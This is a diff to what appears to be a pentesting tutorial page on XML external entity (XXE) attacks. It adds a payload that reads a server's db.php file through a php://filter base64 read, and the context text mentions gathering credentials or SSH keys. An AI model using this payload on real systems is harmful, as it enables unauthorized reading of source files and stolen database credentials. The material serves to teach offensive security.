@@ -77,6 +77,19 @@ First, we must consider if we can upload files to the remote server, if yes. The
 
 After writing a similar code, we should upload this file to the remote server and execute it. If successful, you may try to further enumerate the target system and gather credentials or SSH keys.
 
+Another good example is the following:
+
+```markup
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
+            <maintitle>
+                <title>&xxe;</title>
+                <cwe>no</cwe>
+                <cvss>no</cvss>
+                <reward>no</reward>
+            </maintitle>
+```
+
 ## References
 
 {% embed url="https://portswigger.net/web-security/xxe" %}
